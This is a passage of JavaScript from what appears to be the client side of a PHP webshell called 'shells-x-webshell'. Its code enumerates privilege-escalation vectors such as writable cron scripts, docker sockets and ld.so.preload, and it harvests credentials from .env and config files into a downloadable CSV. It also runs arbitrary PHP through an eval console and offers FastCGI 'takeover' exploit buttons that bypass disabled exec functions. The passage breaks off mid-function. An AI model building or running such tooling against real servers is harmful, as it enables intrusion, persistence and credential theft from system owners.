    diag.cron_jobs.forEach(j => (j.writable_scripts || []).forEach(s => writableCronScripts.push(j.source + ' → ' + s)));
    if (writableCronSources.length) privescLines.push('Writable cron source files: ' + writableCronSources.map(j => j.source).join(', '));
    if (writableCronScripts.length) {
      privescLines.push('Writable cron-invoked scripts:');
      writableCronScripts.forEach(w => privescLines.push('  • ' + w));
    }
  }
  if (diag.ld_preload) {
    const lp = diag.ld_preload;
    if (lp.writable) privescLines.push('/etc/ld.so.preload is WRITABLE — global library injection vector');
    else if (lp.content) privescLines.push('/etc/ld.so.preload set: ' + lp.content.trim().slice(0, 200));
    if (lp.env_value) privescLines.push('LD_PRELOAD env: ' + lp.env_value);
  }
  if (diag.systemd_timers && diag.systemd_timers.length) {
    const wt = diag.systemd_timers.filter(t => t.timer_writable || t.exec_writable);
    if (wt.length) {
      privescLines.push('Writable systemd timer chain:');
      wt.forEach(t => privescLines.push('  • ' + t.timer_path + (t.timer_writable ? ' [timer writable]' : '') + (t.exec_writable ? ' [exec writable: ' + t.exec_start + ']' : '')));
    }
  }
  if (diag.nfs_exports && diag.nfs_exports.no_root_squash && diag.nfs_exports.no_root_squash.length) {
    privescLines.push('NFS no_root_squash exports:');
    diag.nfs_exports.no_root_squash.forEach(e => privescLines.push('  ⚠ ' + e));
  }
  if (diag.docker_socket && diag.docker_socket.sockets && diag.docker_socket.sockets.length) {
    diag.docker_socket.sockets.forEach(s => {
      if (s.writable) privescLines.push('⚠ Docker/Podman socket WRITABLE: ' + s.path + ' (== root)');
      else if (s.readable) privescLines.push('Docker/Podman socket readable: ' + s.path);
    });
  }
  if (privescLines.length) {
    lines.push('— PRIVESC SURFACE —');
    lines.push.apply(lines, privescLines);
    lines.push('');
  }

  // Backup files: .bak / .sql / .sql.gz / wp-config.php.bak etc.
  if (diag.backup_files && diag.backup_files.length) {
    lines.push('— BACKUP FILES —');
    diag.backup_files.slice(0, 20).forEach(b => {
      lines.push('  • ' + b.path + (b.size ? ' (' + Math.round(b.size / 1024) + ' KB)' : '') + (b.readable ? '' : ' [unreadable]'));
    });
    if (diag.backup_files.length > 20) lines.push('  (+' + (diag.backup_files.length - 20) + ' more)');
    lines.push('');
  }

  // Mounts with relevant flags — nosuid/noexec/ro tell the operator what
  // they can or can't drop payloads to. Skip noisy pseudo-fs.
  if (diag.mounts && diag.mounts.length) {
    const interesting = diag.mounts.filter(m => {
      if (!m || !m.mountpoint) return false;
      if (/^(proc|sysfs|cgroup|cgroup2|tmpfs|devtmpfs|devpts|mqueue|pstore|bpf|tracefs|debugfs|securityfs|fusectl|hugetlbfs|configfs|autofs|rpc_pipefs|nsfs|binfmt_misc)$/.test(m.fstype || '')) return false;
      return true;
    });
    if (interesting.length) {
      lines.push('— MOUNTS —');
      interesting.slice(0, 20).forEach(m => {
        const flags = [];
        if (m.nosuid) flags.push('nosuid');
        if (m.noexec) flags.push('noexec');
        if (!m.writable) flags.push('ro');
        lines.push('  • ' + m.mountpoint + '  ' + (m.fstype || '') + (flags.length ? '  [' + flags.join(',') + ']' : ''));
      });
      lines.push('');
    }
  }

  // Routes — just default route + a couple of others, so the operator knows
  // the gateway / next-hop without scrolling through every interface route.
  if (diag.routes && diag.routes.length) {
    const def = diag.routes.find(r => r.dest === '0.0.0.0');
    if (def) {
      lines.push('— ROUTING —');
      lines.push('  default via ' + def.gw + ' dev ' + def.iface);
      // Show a few additional routes for situational awareness
      diag.routes.filter(r => r.dest !== '0.0.0.0').slice(0, 4).forEach(r => {
        lines.push('  ' + r.dest + '/' + r.mask + ' via ' + (r.gw === '0.0.0.0' ? 'direct' : r.gw) + ' dev ' + r.iface);
      });
      lines.push('');
    }
  }

  // Credentials: list the files that contributed without pasting raw values.
  // Combines .env files (env-style) and credential_files (multi-format) so
  // the operator can audit provenance.
  const credPaths = [];
  if (diag.env_files) credPaths.push.apply(credPaths, Object.keys(diag.env_files));
  if (diag.credential_files) credPaths.push.apply(credPaths, Object.keys(diag.credential_files));
  if (credPaths.length) {
    lines.push('— CREDENTIAL SOURCES (parsed into credentials) —');
    Array.from(new Set(credPaths)).sort().forEach(p => lines.push('  • ' + p));
    lines.push('');
  }

  lines.push('— BUILD —');
  push('Webshell build:', (typeof __BUILD !== 'undefined' && __BUILD.short_id) ? __BUILD.short_id : null);
  push('Exported at:',    new Date().toISOString());

  return lines.join('\n');
}

// Merge diagnostics-derived facts into the host bundle for the target itself,
// plus add any ARP-discovered hosts as their own bundles.
function _faradayApplyDiag(hosts, diag) {
  if (!diag) return;
  const targetIp = diag.target_ip || '';
  const targetHost = diag.target_host || '';

  // Ensure target host bundle exists
  let t = null;
  if (targetIp) {
    if (!hosts[targetIp]) hosts[targetIp] = { ip: targetIp, hostnames: targetHost ? [targetHost] : [], mac: '', os: diag.os || '', services: [], vulnerabilities: [], credentials: [] };
    t = hosts[targetIp];
    if (targetHost && t.hostnames.indexOf(targetHost) === -1) t.hostnames.push(targetHost);
    if (!t.os && diag.os) t.os = diag.os;
    // Rich diagnostic snapshot becomes the host description — gives the
    // operator a one-glance posture summary in Faraday's Host detail view.
    t.description = _faradayHostDescription(diag);
  }

  if (t) {
    // Credentials from three sources: .env files (env-style), credential_files
    // (multi-format: my.cnf, .pgpass, wp-config.php, database.yml, env.php),
    // and framework details (db_user/db_pass already structured by diag.php).
    // All three can overlap — dedup at the end by (username, password, endpoint).
    const collected = [];
    Object.entries(diag.env_files || {}).forEach(([path, content]) => {
      collected.push.apply(collected, _faradayParseEnvCredentials(path, content));
    });
    Object.entries(diag.credential_files || {}).forEach(([path, content]) => {
      collected.push.apply(collected, _faradayParseCredentialFile(path, content));
    });
    collected.push.apply(collected, _faradayFrameworkCredentials(diag.frameworks));
    _faradayDedupCredentials(collected).forEach(c => t.credentials.push(c));

    // Listening ports on the target become Services on the target host.
    // Skip loopback-only bindings (127.0.0.1:xxxx, ::1) — those are not
    // network-reachable and just pollute the Faraday Services view with
    // PHP-FPM / Redis / memcached internal sockets. The `loopback` flag
    // comes from the diag.php parser; older blobs without it default to
    // network-reachable so we don't regress against an old backend.
    (diag.open_ports || []).forEach(entry => {
      const isObj = typeof entry === 'object' && entry !== null;
      if (isObj && entry.loopback === true) return;
      const portNum = isObj ? entry.port : entry;
      const port = parseInt(portNum, 10);
      if (!Number.isFinite(port) || port <= 0) return;
      const key = port + '/tcp';
      if (t.services.some(s => (s.port + '/' + s.protocol) === key)) return;
      const procInfo = (isObj && entry.cmd)
        ? ' (pid ' + (entry.pid || '?') + ': ' + entry.cmd + (entry.uid !== undefined ? ', uid=' + entry.uid : '') + ')'
        : '';
      const bindInfo = (isObj && entry.local_addr && entry.local_addr !== '?')
        ? ' bound to ' + entry.local_addr
        : '';
      t.services.push({
        name: '', port: port, protocol: 'tcp', status: 'open',
        version: '', description: 'Listening on shell host' + bindInfo + procInfo,
        vulnerabilities: [],
      });
    });
  }

  // ARP hosts → additional Host bundles (with MAC). Try to resolve a
  // hostname from /etc/hosts via the diag blob if we have it (we don't right
  // now — diag.php doesn't read /etc/hosts), so ARP-only hosts remain
  // hostname-less. Documented gap; can be wired later if diag exposes a
  // hosts-file map.
  (diag.arp_hosts || []).forEach(a => {
    if (!a.ip || a.ip === '0.0.0.0') return;
    if (!hosts[a.ip]) hosts[a.ip] = { ip: a.ip, hostnames: [], mac: a.mac || '', os: '', services: [], vulnerabilities: [], credentials: [] };
    else if (!hosts[a.ip].mac && a.mac) hosts[a.ip].mac = a.mac;
  });
}

// =================== Top-level builders ===================

// Backend diag fetch + cache. Runs on every export so MAC merge, ARP-only
// hosts, and the target-host description never silently disappear just
// because the operator hasn't opened the Diagnostics tab yet. Best-effort:
// if the backend errors we proceed without enrichment instead of failing
// the export.
function _faradayEnsureDiag(force) {
  if (window._diagInFlight) return window._diagInFlight;
  if (!force && window._lastDiagBlob) return Promise.resolve();
  const fd = new FormData();
  fd.append('action', 'diag');
  window._diagInFlight = fetchJSON(fd).then(d => {
    if (d && !d.error) window._lastDiagBlob = d;
  }).catch(err => {
    console.warn('faraday: diag fetch failed, exporting without enrichment:', err);
  }).finally(() => { window._diagInFlight = null; });
  return window._diagInFlight;
}

function faradayBuildPayload(opts) {
  opts = opts || {};
  const cfg = _faradayCfg();
  const t0 = new Date();

  return _faradayEnsureDiag(opts.forceDiag).then(() => dbOpen().then(db => new Promise((res, rej) => {
    const tx = db.transaction(['scans', 'scan_results'], 'readonly');
    const scansReq = tx.objectStore('scans').getAll();
    const resultsReq = tx.objectStore('scan_results').getAll();
    let scans = [];
    let results = [];
    scansReq.onsuccess = e => { scans = e.target.result || []; };
    resultsReq.onsuccess = e => { results = e.target.result || []; };
    tx.oncomplete = () => res({ scans, results });
    tx.onerror = e => rej(e.target.error);
  }))).then(({ scans: allScans, results: allResults }) => {
    const scans = opts.scanIds
      ? allScans.filter(s => opts.scanIds.indexOf(s.id) !== -1)
      : (opts.includeAll ? allScans : []);
    const results = opts.scanIds
      ? allResults.filter(r => opts.scanIds.indexOf(r.scan_id) !== -1)
      : (opts.includeAll ? allResults : []);
    const hosts = _faradayHostsFromScanResults(results);
    // Always merge MACs from the diagnostics ARP cache into any host the
    // payload already contains — this is cheap, useful, and works for
    // per-scan exports too. Only add ARP-only hosts + diag findings when
    // the user explicitly asked for diag/full export.
    const diagBlob = window._lastDiagBlob || null;
    _faradayMergeArpMacs(hosts, diagBlob);
    if (opts.includeDiag || opts.includeAll) _faradayApplyDiag(hosts, diagBlob);

    const hostArr = Object.values(hosts);
    const t1 = new Date();
    const params = (opts.scanIds ? 'scan_ids=' + opts.scanIds.join(',') + ' ' : '') +
                   (opts.includeAll ? 'include_all=1 ' : '') +
                   (opts.includeDiag ? 'include_diag=1 ' : '') +
                   (typeof __BUILD !== 'undefined' && __BUILD.short_id ? 'build=' + __BUILD.short_id : '');

    return {
      command: {
        tool: 'shells-x-webshell',
        command: opts.scanIds ? 'scan_export' : (opts.includeAll ? 'full_export' : 'diag_export'),
        user: cfg.user,
        hostname: location.host,
        params: params.trim(),
        import_source: 'report',
        start_date: _isoNoMs(t0),
        end_date:   _isoNoMs(t1),
      },
      hosts: hostArr,
    };
  });
}

function _isoNoMs(d) { return d.toISOString().replace(/\.\d{3}Z$/, ''); }

// Faraday's `faraday_json` plugin silently DROPS credential arrays on import
// (see faraday_plugins/plugins/repo/faraday_json/plugin.py:38 & :48 —
// `host.pop('credentials', '')`). Credentials must be re-imported via the
// separate `faradaycredential_csv` plugin, which auto-detects by header. We
// therefore emit two files per export: the main JSON and a credentials CSV.
// The CSV is uploaded with the same `faraday-cli tool report` command — the
// plugin is selected automatically from the header row.
function _faradayCsvEscape(v) {
  v = String(v == null ? '' : v);
  // Always quote and double-up internal quotes — handles commas, newlines,
  // values containing quote chars. Safe default; no need to be clever.
  return '"' + v.replace(/"/g, '""') + '"';
}

function _faradayBuildCredentialsCsv(payload) {
  // Header must match faradaycredential_csv plugin's column names (username,
  // password, endpoint) so the plugin auto-detects. We prefix endpoint with
  // the host IP so the operator can trace each credential back to its source
  // host in Faraday — the CSV plugin imports creds without host attribution,
  // so this string is the only provenance left.
  const lines = ['username,password,endpoint'];
  let count = 0;
  payload.hosts.forEach(h => {
    (h.credentials || []).forEach(c => {
      const username = c.username || c.name || '';
      const password = c.password || '';
      // Skip empty-password creds — CSV plugin requires both username AND
      // password to be non-empty (plugin.py:138). Pushing them would just
      // silently drop them again.
      if (!username || !password) return;
      const endpoint = (h.ip ? h.ip + ' :: ' : '') + (c.endpoint || '') +
                       (c.name && c.name !== username ? ' (' + c.name + ')' : '');
      lines.push([username, password, endpoint].map(_faradayCsvEscape).join(','));
      count++;
    });
  });
  return { csv: lines.join('\n') + '\n', count };
}

function _faradayDownloadBlob(blob, filename) {
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 500);
}

function _faradayDownloadJson(payload, filename) {
  _faradayDownloadBlob(new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' }), filename);
}

// Two-file download. Returns the credential count for the toast.
// Per-scan exports (faradayExportScan) skip _faradayApplyDiag, so they have
// zero credentials and the CSV download is correctly suppressed by count==0.
// Only diag / full exports trigger the second download.
function _faradayDownloadPair(payload, jsonName, csvName) {
  _faradayDownloadJson(payload, jsonName);
  const { csv, count } = _faradayBuildCredentialsCsv(payload);
  if (count > 0) {
    // Small delay so browsers don't merge the two downloads into one prompt
    // — Firefox in particular collapses near-simultaneous downloads.
    setTimeout(() => {
      _faradayDownloadBlob(new Blob([csv], { type: 'text/csv' }), csvName);
    }, 300);
  }
  return count;
}

function _faradayToast(payload, csvCount, csvName, jsonName) {
  const hosts = payload.hosts.length;
  let svc = 0;
  payload.hosts.forEach(h => { svc += (h.services || []).length; });
  const msg = [
    'Faraday export: ' + hosts + ' hosts, ' + svc + ' services, ' + csvCount + ' credentials.',
    '',
    'Recon only — no Vulnerability entities are emitted.',
    '',
    'Upload the JSON:',
    '  faraday-cli tool report ' + (jsonName || '<json>') + ' --plugin-id Faraday_JSON',
  ];
  if (csvCount > 0) {
    msg.push('');
    msg.push('Credentials (' + csvName + '): import via Faraday UI →');
    msg.push('Credentials view → "Import CSV" button. faraday-cli cannot');
    msg.push('import credentials (server bulk_create has no credentials field).');
  }
  alert(msg.join('\n'));
}

function _faradayFilename(cmd, ext) {
  const cfg = _faradayCfg();
  const ws = (cfg.workspace || 'workspace').replace(/[^a-z0-9_-]/gi, '_');
  return 'shells-x-' + cmd + '-' + ws + '-' + Math.floor(Date.now() / 1000) + '.' + (ext || 'json');
}

function faradayExportScan(scanId) {
  if (!_faradayRequireWorkspace()) return;
  faradayBuildPayload({ scanIds: [scanId] }).then(payload => {
    if (!payload.hosts.length) { alert('No open ports in that scan to export.'); return; }
    const jsonName = _faradayFilename('scan', 'json');
    const csvName  = _faradayFilename('scan-credentials', 'csv');
    const count = _faradayDownloadPair(payload, jsonName, csvName);
    _faradayToast(payload, count, csvName, jsonName);
  }).catch(err => alert('Export failed: ' + err));
}

function faradayExportDiag() {
  if (!_faradayRequireWorkspace()) return;
  if (!window._lastDiagBlob) {
    alert('Run a Diagnostics refresh first (no cached diag blob).');
    return;
  }
  faradayBuildPayload({ includeDiag: true }).then(payload => {
    if (!payload.hosts.length) { alert('Nothing exportable in the diagnostics blob.'); return; }
    const jsonName = _faradayFilename('diag', 'json');
    const csvName  = _faradayFilename('diag-credentials', 'csv');
    const count = _faradayDownloadPair(payload, jsonName, csvName);
    _faradayToast(payload, count, csvName, jsonName);
  }).catch(err => alert('Export failed: ' + err));
}

function faradayExportAll() {
  if (!_faradayRequireWorkspace()) return;
  faradayBuildPayload({ includeAll: true, includeDiag: true }).then(payload => {
    if (!payload.hosts.length) { alert('No data to export yet. Run a scan or diagnostics first.'); return; }
    const jsonName = _faradayFilename('full', 'json');
    const csvName  = _faradayFilename('full-credentials', 'csv');
    const count = _faradayDownloadPair(payload, jsonName, csvName);
    _faradayToast(payload, count, csvName, jsonName);
  }).catch(err => alert('Export failed: ' + err));
}

// Populate the settings inputs from localStorage as soon as the DOM is ready,
// and bind the click-outside / Esc handlers for the dropdown panel.
function _faradayInit() { faradayLoadSettings(); _faradayBindOutsideClose(); }
if (document.readyState !== 'loading') _faradayInit();
else document.addEventListener('DOMContentLoaded', _faradayInit);



// ==================== TERMINAL ENGINE ====================
// Generic, language-agnostic terminal machinery. Adapters (terminal_php.js,
// terminal_shell.js, future terminal_python.js, …) call Terminal.bind(cfg)
// to declare a card's snippets + prompt + run-action; this file does the
// rest (streaming, composer wiring, history, snippet buttons, run lifecycle).

const STREAM_MAX_ENTRIES = 2000;
const STREAM_BOTTOM_THRESHOLD = 24;   // px tolerance for "user is at bottom"

function _streamAtBottom(el) {
  return el.scrollHeight - el.scrollTop - el.clientHeight < STREAM_BOTTOM_THRESHOLD;
}

function streamAppend(streamId, type, text) {
  const el = document.getElementById(streamId);
  if (!el || text === undefined || text === null || text === '') return;
  const wasAtBottom = _streamAtBottom(el);
  const div = document.createElement('div');
  div.className = 'stream-' + type;   // stream-cmd | stream-out | stream-err | stream-sep
  div.textContent = text;
  el.appendChild(div);
  // Cap scrollback so a 5MB phpinfo() can't OOM the tab on long sessions.
  while (el.childElementCount > STREAM_MAX_ENTRIES) el.removeChild(el.firstChild);
  if (wasAtBottom) el.scrollTop = el.scrollHeight;
}

function streamSep(streamId) {
  const el = document.getElementById(streamId);
  if (!el) return;
  const wasAtBottom = _streamAtBottom(el);
  const sep = document.createElement('div');
  sep.className = 'stream-sep';
  el.appendChild(sep);
  if (wasAtBottom) el.scrollTop = el.scrollHeight;
}

function _streamText(el) {
  const parts = [];
  for (const child of el.children) {
    if (child.classList.contains('stream-sep')) parts.push('');
    else parts.push(child.textContent);
  }
  return parts.join('\n');
}

function streamClear(streamId) {
  const el = document.getElementById(streamId);
  if (el) el.textContent = '';
}

function streamCopy(streamId) {
  const el = document.getElementById(streamId);
  if (!el) return;
  clipCopy(_streamText(el));
}

function streamDownload(streamId, prefix) {
  const el = document.getElementById(streamId);
  if (!el) return;
  const blob = new Blob([_streamText(el)], { type: 'text/plain' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = (prefix || 'stream') + '_' + Date.now() + '.txt';
  a.click();
}

// ==================== ADAPTER REGISTRY ====================

const _adapters = {};

// Markers (e.g. '$ ' for shell) partition the shared `history` IDB store.
// A catch-all adapter (marker='') declares foreign markers via `excludeMarkers`
// so partitioning is deterministic regardless of bind order. (Earlier version
// peeked at other adapters at load time — that broke when PHP's history loaded
// before the async shell-probe bind, since the engine didn't yet know about
// '$ '.)
function _cmdMatchesAdapter(cmd, adapterId) {
  const adapter = _adapters[adapterId];
  if (!adapter) return false;
  if (adapter.historyMarker) return cmd.startsWith(adapter.historyMarker);
  for (const m of adapter.excludeMarkers) {
    if (cmd.startsWith(m)) return false;
  }
  return true;
}

function _stripMarker(cmd, marker) {
  return marker && cmd.startsWith(marker) ? cmd.slice(marker.length) : cmd;
}

function _initSnippets(adapter) {
  const container = document.getElementById(adapter.snippetEl);
  if (!container) return;
  container.append(...(adapter.snippets || []).map(([label, code]) => {
    const b = document.createElement('button');
    b.className = 'btn btn-sm btn-secondary';
    b.textContent = label;
    b.addEventListener('click', () => {
      const input = document.getElementById(adapter.inputEl);
      if (!input) return;
      input.value = code;
      input.focus();
    });
    return b;
  }));
}

function _initHistory(adapter) {
  if (typeof dbGetAll !== 'function') return;
  dbGetAll('history')
    .then(rows => {
      // history is sorted newest-first by db.js; reverse so ↑ steps backward
      // through time naturally.
      const fromIdb = rows
        .filter(r => r && r.cmd && _cmdMatchesAdapter(r.cmd, adapter.id))
        .map(r => _stripMarker(r.cmd, adapter.historyMarker))
        .reverse();
      // Remember the command the operator was recalling (if any) so we can
      // restore their nav position by content after dedup may have shifted
      // indices. Index-arithmetic preservation breaks once entries are
      // collapsed; content-addressing survives.
      const currentCmd = (adapter.histIdx >= 0 && adapter.histIdx < adapter.history.length)
        ? adapter.history[adapter.histIdx]
        : null;
      // Prepend prior-session history to whatever the operator pushed during
      // the IDB-load window. In-memory pushes are sync and canonical; IDB load
      // is treated as "older history" prefix data. This eliminates the race
      // where a command run during IDB load would otherwise be clobbered.
      const merged = fromIdb.concat(adapter.history);
      // Consecutive-dedup — same shape as _run's local push dedup and as
      // bash HISTIGNOREDUPS. Collapses the common "ran X last session, ran X
      // first this session" duplicate at the IDB/local boundary.
      adapter.history = merged.filter((cmd, i) => cmd !== merged[i - 1]);
      const restored = currentCmd !== null ? adapter.history.lastIndexOf(currentCmd) : -1;
      adapter.histIdx = restored >= 0 ? restored : adapter.history.length;
    })
    .catch(() => { /* IDB unavailable — in-memory history still works for this session */ });
}

function _initKeydown(adapter) {
  const input = document.getElementById(adapter.inputEl);
  if (!input) return;
  adapter._inputEl = adapter.inputEl;   // remembered for idempotent re-bind
  adapter._keydown = e => {
    // Enter (alone) submits; Shift+Enter inserts a newline.
    if (e.key === 'Enter' && !e.shiftKey && !e.ctrlKey && !e.altKey) {
      e.preventDefault();
      _run(adapter.id);
      return;
    }
    // History nav: plain ↑/↓ when caret is on the edge line of the textarea
    // (so multi-line cursor nav still works mid-buffer). Ctrl+↑/↓ forces
    // history regardless of caret position.
    if (e.key === 'ArrowUp' && !e.shiftKey && !e.altKey) {
      const before = e.target.value.substring(0, e.target.selectionStart);
      if (e.ctrlKey || !before.includes('\n')) {
        e.preventDefault();
        if (!adapter.history.length) return;
        if (adapter.histIdx <= 0) adapter.histIdx = 0;
        else adapter.histIdx--;
        e.target.value = adapter.history[adapter.histIdx] || '';
        return;
      }
    }
    if (e.key === 'ArrowDown' && !e.shiftKey && !e.altKey) {
      const after = e.target.value.substring(e.target.selectionEnd);
      if (e.ctrlKey || !after.includes('\n')) {
        e.preventDefault();
        if (adapter.histIdx < adapter.history.length - 1) {
          adapter.histIdx++;
          e.target.value = adapter.history[adapter.histIdx];
        } else {
          adapter.histIdx = adapter.history.length;
          e.target.value = '';
        }
        return;
      }
    }
    if (e.ctrlKey && e.key === 'l') {
      e.preventDefault();
      streamClear(adapter.outputEl);
    }
  };
  input.addEventListener('keydown', adapter._keydown);
}

function _run(adapterId) {
  const adapter = _adapters[adapterId];
  if (!adapter || adapter.inFlight) return;   // serialise per-adapter
  const input = document.getElementById(adapter.inputEl);
  if (!input) return;
  const code = input.value.trim();
  if (!code) return;
  if (adapter.gate && !adapter.gate()) return;   // adapter can veto (e.g. shell unavailable)

  // SYNC push to in-memory history — this is the canonical store ↑/↓ reads.
  // IDB write below is fire-and-forget; IDB load on bind prepends prior-
  // session entries. Treating in-memory as canonical (instead of letting
  // async IDB ops overwrite it) is what keeps history race-free.
  // Dedupe consecutive identical entries.
  if (adapter.history[adapter.history.length - 1] !== code) adapter.history.push(code);
  adapter.histIdx = adapter.history.length;

  // Echo into stream. Lines after the first use contPrompt so a 20-line paste
  // still reads naturally.
  const linePrefix = adapter.echoPrefix ? adapter.echoPrefix() : adapter.prompt;
  const codeLines = code.split('\n');
  codeLines.forEach((line, i) => {
    streamAppend(adapter.outputEl, 'cmd', (i === 0 ? linePrefix + ' ' : adapter.contPrompt + ' ') + line);
  });
  input.value = '';

  // Build request — guarded so a throwing adapter.beforeRun can't leave
  // inFlight=true forever (would permanently lock the adapter, silently
  // dropping every subsequent submit).
  const fd = new FormData();
  try {
    fd.append('action', adapter.runAction);
    fd.append(adapter.codeField, code);
    if (adapter.timeoutField) fd.append(adapter.timeoutField, adapter.timeoutValue);
    if (adapter.beforeRun) adapter.beforeRun(fd, code);
  } catch (err) {
    streamAppend(adapter.outputEl, 'err', '[err] Request setup failed: ' + String(err));
    streamSep(adapter.outputEl);
    return;
  }

  adapter.inFlight = true;
  fetchJSON(fd)
    .then(data => {
      if (data.error) streamAppend(adapter.outputEl, 'err', '[err] ' + data.error);
      const out = (data.output || '').replace(/\n+$/, '');
      if (out) streamAppend(adapter.outputEl, 'out', out);
      else if (!data.error) streamAppend(adapter.outputEl, 'out', '(no output)');
      if (adapter.afterRun) {
        // Same reason as beforeRun: don't let an adapter callback abort the
        // result-rendering flow (history write below) or trip the .catch.
        try { adapter.afterRun(data); }
        catch (err) { streamAppend(adapter.outputEl, 'err', '[err] afterRun failed: ' + String(err)); }
      }
      streamSep(adapter.outputEl);
      dbPut('history', {
        cmd: (adapter.historyMarker || '') + code,
        out: data.output || data.error || '',
        error: data.error || null,
        ts: new Date().toISOString() + '#' + Math.random().toString(36).slice(2, 10),
      });
    })
    .catch(err => {
      streamAppend(adapter.outputEl, 'err', '[err] Request error: ' + String(err));
      streamSep(adapter.outputEl);
    })
    .finally(() => { adapter.inFlight = false; });
}

// Write adapter-declared labels into the card header so adapters are the
// source of truth (engine API matches what the UI actually shows). The
// layout pre-seeds `.card-header-name` and `.card-header-label` spans —
// targeting those keeps us from clobbering siblings like the OS-shell
// status badge that lives inside `.card-header-left`.
function _initLabels(adapter) {
  const card = document.getElementById(adapter.outputEl)?.closest('.card');
  if (!card) return;
  const nameEl = card.querySelector('.card-header-name');
  if (nameEl && adapter.displayName) nameEl.textContent = adapter.displayName;
  const labelEl = card.querySelector('.card-header-label');
  if (labelEl) {
    if (adapter.hintsLabel) {
      labelEl.textContent = adapter.hintsLabel + ':';
      labelEl.hidden = false;
    } else {
      labelEl.hidden = true;
    }
  }
}

function bind(config) {
  const adapter = Object.assign({
    history: [],
    histIdx: -1,
    inFlight: false,
    snippets: [],
    excludeMarkers: [],
  }, config);
  // Idempotent re-bind: an adapter rebound for the same card (e.g. the
  // bypass panel enabling the OS shell after probing) must not stack a
  // second keydown listener or duplicate snippet buttons.
  const prev = _adapters[adapter.id];
  if (prev && prev._keydown && prev._inputEl) {
    const prevInput = document.getElementById(prev._inputEl);
    if (prevInput) prevInput.removeEventListener('keydown', prev._keydown);
    if (prev.snippetEl) {
      const prevSnips = document.getElementById(prev.snippetEl);
      if (prevSnips) prevSnips.textContent = '';
    }
  }
  _adapters[adapter.id] = adapter;
  _initLabels(adapter);
  _initSnippets(adapter);
  _initHistory(adapter);
  _initKeydown(adapter);
}

function clearTerminalHistory() {
  Object.keys(_adapters).forEach(id => {
    _adapters[id].history = [];
    _adapters[id].histIdx = -1;
  });
}

window.Terminal = {
  bind, clearTerminalHistory,
  streamAppend, streamSep, streamClear, streamCopy, streamDownload,
};

// Inline `onclick="streamClear(...)"` handlers in card headers expect these
// as globals. Re-export so the header buttons keep working without HTML edits.
window.streamAppend   = streamAppend;
window.streamSep      = streamSep;
window.streamClear    = streamClear;
window.streamCopy     = streamCopy;
window.streamDownload = streamDownload;


// ==================== PHP CONSOLE ADAPTER ====================
// Binds the PHP-flavored console card. The engine (terminal_engine.js) owns
// streaming, composer, history, snippet wiring; this file just declares what
// makes "PHP" different from "Shell" or future languages.

Terminal.bind({
  id: 'php',
  displayName: 'PHP',
  prompt: 'php>',
  contPrompt: '...',
  hintsLabel: 'snippets',

  snippets: window.TERMINAL_SNIPPETS?.php || [],

  outputEl: 'console-output',
  inputEl: 'console-input',
  snippetEl: 'snippet-buttons',
  downloadPrefix: 'php-console',

  historyMarker: '',
  excludeMarkers: ['$ '],

  runAction: 'eval',
  codeField: 'code',
  timeoutField: 'timeout',
  timeoutValue: '30',
});


// ==================== FASTCGI BYPASS PANEL ====================
// Renders on the Shell card when the OS shell probe finds every exec
// function disabled. Offers the FastCGI takeover techniques as explicit
// exploit buttons; a successful exploit re-enables the OS shell input and
// routes every command through the bypass — each command is a full,
// self-cleaning cycle (pre-heal -> probe -> exploit -> verify cleanup).
//
// A successful exploit is remembered in sessionStorage (technique +
// endpoint + .so path), so a page reload silently re-validates and
// re-enables the shell instead of forcing the operator to re-exploit.

const BYPASS_STATE_KEY = 'sx.bypass';

const Bypass = {
  ep: '',        // chosen FastCGI endpoint
  tech: '',      // technique that succeeded: 't1' | 't2'
  so: '',        // t2: path to the ABI-matched module on the target
  busy: false,

  out(type, text) { streamAppend('os-shell-output', type, text); },

  saveState() {
    try {
      sessionStorage.setItem(BYPASS_STATE_KEY, JSON.stringify({ tech: this.tech, ep: this.ep, so: this.so }));
    } catch (e) { /* storage unavailable — state just won't survive reload */ }
  },

  loadState() {
    try { return JSON.parse(sessionStorage.getItem(BYPASS_STATE_KEY) || 'null'); }
    catch (e) { return null; }
  },

  clearState() {
    try { sessionStorage.removeItem(BYPASS_STATE_KEY); } catch (e) {}
  },

  // Entry point — called by terminal_shell.js when exec probing failed.
  show() {
    const panel = document.getElementById('bypass-panel');
    if (!panel) return;
    const saved = this.loadState();
    if (saved && saved.tech && saved.ep) {
      // previous successful exploit — re-validate quietly, re-enable on success
      panel.hidden = false;
      panel.innerHTML = '<span style="color:var(--muted)">&#8635; restoring previous bypass session (' +
        escHtml(saved.tech.toUpperCase()) + ' on ' + escHtml(saved.ep) + ')&hellip;</span>';
      this.tech = saved.tech;
      this.ep = saved.ep;
      this.so = saved.so || '';
      this.validateSaved(saved)
        .then(ok => { if (!ok) { this.clearState(); this.discover(); } })
        .catch(() => { this.clearState(); this.discover(); });
      return;
    }
    this.discover();
  },

  // Re-run the probe + canary against the saved endpoint/technique. On
  // success the shell is enabled again (exploit() already prints a compact
  // restore log); resolves false when the saved state no longer works.
  validateSaved(saved) {
    return this.exploit(saved.tech, true);
  },

  discover() {
    const panel = document.getElementById('bypass-panel');
    if (!panel) return;
    panel.hidden = false;
    panel.innerHTML = '<span style="color:var(--muted)">&#8987; enumerating FastCGI endpoints&hellip;</span>';
    const fd = new FormData();
    fd.append('action', 'bypass');
    fd.append('mode', 'discover');
    fetchJSON(fd)
      .then(data => this.render(data))
      .catch(e => {
        panel.innerHTML = '';
        this.out('err', '[bypass] discovery request failed: ' + String(e.message || e));
      });
  },

  render(data) {
    const panel = document.getElementById('bypass-panel');
    if (!panel) return;
    panel.innerHTML = '';
    if (!data.ok || !data.endpoints || !data.endpoints.length) {
      panel.innerHTML = '<span class="badge badge-no">&#x2716; FastCGI takeover: no endpoint found</span>'
        + '<span style="color:var(--muted)">not exploitable from this uid</span>';
      this.out('err', '[bypass] no FastCGI endpoint identified from this uid — not exploitable here');
      return;
    }
    // Endpoint picker — defaults to the first identified pool.
    this.ep = data.endpoints[0].ep;
    const row = document.createElement('div');
    row.style.cssText = 'display:flex;gap:8px;align-items:center;flex-wrap:wrap';

    const label = document.createElement('span');
    label.style.color = 'var(--muted)';
    label.textContent = 'exec disabled — FastCGI takeover:';
    row.appendChild(label);

    const sel = document.createElement('select');
    sel.id = 'bypass-ep';
    sel.style.cssText = 'background:transparent;color:inherit;border:1px solid var(--border);border-radius:6px;padding:3px 6px;font-size:12px';
    data.endpoints.forEach(e => {
